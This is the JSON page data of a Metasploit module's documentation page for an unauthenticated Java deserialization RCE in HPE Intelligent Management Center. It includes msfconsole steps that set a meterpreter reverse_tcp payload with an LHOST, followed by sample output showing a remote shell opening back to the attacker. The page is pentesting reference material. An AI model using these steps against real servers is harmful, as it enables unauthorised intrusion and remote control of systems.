{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/hp_imc_java_deserialize","result":{"data":{"moduleMetadataJson":{"id":"8e5cd893-ff45-5c21-8226-573526f2f8c0","name":"HP Intelligent Management Java Deserialization RCE","fullname":"exploit/windows/http/hp_imc_java_deserialize","description":"This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of\n        Hewlett Packard Enterprise Intelligent Management Center. Authentication is not required to exploit\n        this vulnerability.\n\n        The specific flaw exists within the WebDMDebugServlet, which listens on TCP ports 8080 and 8443 by\n        default. The issue results from the lack of proper validation of user-supplied data, which can result\n        in deserialization of untrusted data. An attacker can leverage this vulnerability to execute arbitrary\n        code in the context of SYSTEM.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/hp_imc_java_deserialize","documentationSlug":"/modules/documentation/exploit/windows/http/hp_imc_java_deserialize","referencesSlug":"/modules/references/exploit/windows/http/hp_imc_java_deserialize"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The module exploits a RCE bug on vulnerable installations of Hewlett Packard Enterprise Intelligent Management Center. Authentication is not required.</p>\n<p>  The specific flaw exists within the <code class=\"language-text\">WebDMDebugServlet</code>, which listens on TCP ports <code class=\"language-text\">8080</code> and <code class=\"language-text\">8443</code> by default. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute arbitrary code in the context of SYSTEM.</p>\n<p>  On a Windows machine, download and install a trial version of HPE IMC from here:</p>\n<p>  <a href=\"https://h10145.www1.hpe.com/downloads/DownloadSoftware.aspx?SoftwareReleaseUId=19066&#x26;ProductNumber=JG748AAE&#x26;lang=&#x26;cc=&#x26;prodSeriesId=&#x26;SaidNumber=\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://h10145.www1.hpe.com/downloads/DownloadSoftware.aspx?SoftwareReleaseUId=19066&#x26;ProductNumber=JG748AAE&#x26;lang=&#x26;cc=&#x26;prodSeriesId=&#x26;SaidNumber=</a></p>\n<p>  You need .Net 2.0, but that's the only dependency.</p>\n<p>  Make sure to follow any instructions on setting up SSL correctly (certain cipher suites does not play well with the software). These instructions may vary depending on the win version you set it up on. On a Windows Server 2012 R2 I had to disable certain cipher suites. The exploit has been tested on Windows Server 2012 R2 and Windows Server 2008 R2.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  A successful check of the exploit will look like this:</p>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/hp_imc_java_deserialize</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS &lt;RHOSTS&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST &lt;LHOST&gt;</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target is vulnerable.</code> in console.</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a meterpreter shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong></p>\n<p>  Path to the IMC application, the default location is <code class=\"language-text\">/imc</code>.</p>\n<p>  <strong>SSL</strong></p>\n<p>  As set up by default, IMC is vulnerable both over port <code class=\"language-text\">8080</code> and <code class=\"language-text\">8443</code> (SSL). Set this parameter to <code class=\"language-text\">true</code> and change <code class=\"language-text\">RPORT</code> if you'd like to exploit over SSL.</p>\n<p>  <strong>RPORT</strong></p>\n<p>  Set this to the appropriate port, <code class=\"language-text\">8080</code> (default) or <code class=\"language-text\">8443</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>All versions below 7.3 E0504P2 should be vulnerable remotely.</p>\n<h3 id=\"hpe-imc-73-e0504p2\" style=\"position:relative;\"><a href=\"#hpe-imc-73-e0504p2\" aria-label=\"hpe imc 73 e0504p2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HPE IMC 7.3 E0504P2</h3>\n<p>  Here's showing the expected output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; exploit\n\n[*] Started reverse TCP handler on 10.0.0.1:4444 \n[*] Sending serialized Java object (11290 bytes)...\n[*] Sending stage (179779 bytes) to 10.0.0.2\n[*] Meterpreter session 2 opened (10.0.0.1:4444 -&gt; 10.0.0.2:49284) at 2018-11-17 09:43:07 +0100\n\nmeterpreter &gt; sysinfo \nComputer        : SERVER_NAME\nOS              : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8e5cd893-ff45-5c21-8226-573526f2f8c0"}}}